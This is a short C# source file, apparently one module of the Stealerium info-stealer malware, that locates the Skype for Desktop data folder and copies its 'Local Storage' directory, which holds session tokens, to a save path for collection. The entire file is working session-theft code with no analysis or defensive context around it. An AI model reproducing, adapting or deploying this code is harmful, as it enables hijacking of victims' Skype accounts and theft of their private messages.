using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Skype
{
	private static readonly string SkypePath = Path.Combine(Paths.Appdata, "Microsoft\\Skype for Desktop");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(SkypePath))
		{
			return;
		}
		string text = Path.Combine(SkypePath, "Local Storage");
		if (Directory.Exists(text))
		{
			try
			{
				Filemanager.CopyDirectory(text, sSavePath + "\\Local Storage");
			}
			catch
			{
				return;
			}
		}
		Counter.Skype = true;
	}
}
